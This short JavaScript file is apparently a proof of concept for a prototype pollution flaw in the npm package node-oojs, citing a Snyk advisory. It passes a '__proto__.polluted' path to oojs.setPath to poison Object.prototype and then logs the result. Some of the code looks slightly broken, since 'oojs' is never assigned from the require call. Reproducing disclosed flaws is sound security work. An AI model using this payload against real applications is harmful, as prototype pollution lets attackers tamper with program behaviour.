//shttps://snyk.io/vuln/SNYK-JS-NODEOOJS-598678
require('node-oojs');
const assert = require('assert');

var obj = {}
console.log("Before : " + obj.polluted);

oojs.setPath({'__proto__.polluted':"yes"});

console.log(polluted);
